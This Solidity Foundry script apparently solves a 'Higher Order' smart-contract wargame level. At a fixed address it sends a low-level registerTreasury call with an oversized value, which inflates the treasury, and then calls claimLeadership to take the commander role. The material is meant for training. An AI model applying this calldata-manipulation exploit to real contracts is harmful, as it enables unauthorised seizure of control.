// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

interface HigherOrder {
    function registerTreasury() external;
    function claimLeadership() external;
    function treasury() external view returns(uint256);
    function commander() external view returns(address);
}

contract HigherOrderScript is Script {
    HigherOrder public higherOrderContract;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        // higherOrderContract = new HigherOrder();
        higherOrderContract = HigherOrder(0x17e6a22412CC753F9B8c1FF92fBA0f2bcc2B86FD);

        (bool success, ) = address(higherOrderContract).call(abi.encodeWithSignature("registerTreasury(uint8)", 256));

        require(success, "Failed!");

        console.log("Treasury ", higherOrderContract.treasury());

        higherOrderContract.claimLeadership();

        console.log("Commander ", higherOrderContract.commander());

        vm.stopBroadcast();
    }
}
